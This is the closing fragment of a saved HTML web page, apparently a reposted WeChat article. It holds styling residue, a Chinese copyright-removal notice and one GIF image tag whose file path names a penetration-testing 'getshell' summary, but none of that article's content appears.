&quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: right;color: rgba(230, 230, 230, 0.9) !important;"><span style="font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;letter-spacing: 0.75px;text-align: start;background-color: rgb(255, 255, 255);font-size:12px;line-height:32px;;color: rgb(136, 136, 136);">如有侵权，请联系删除</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-04-11_渗透测试-Getshell总结/4_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>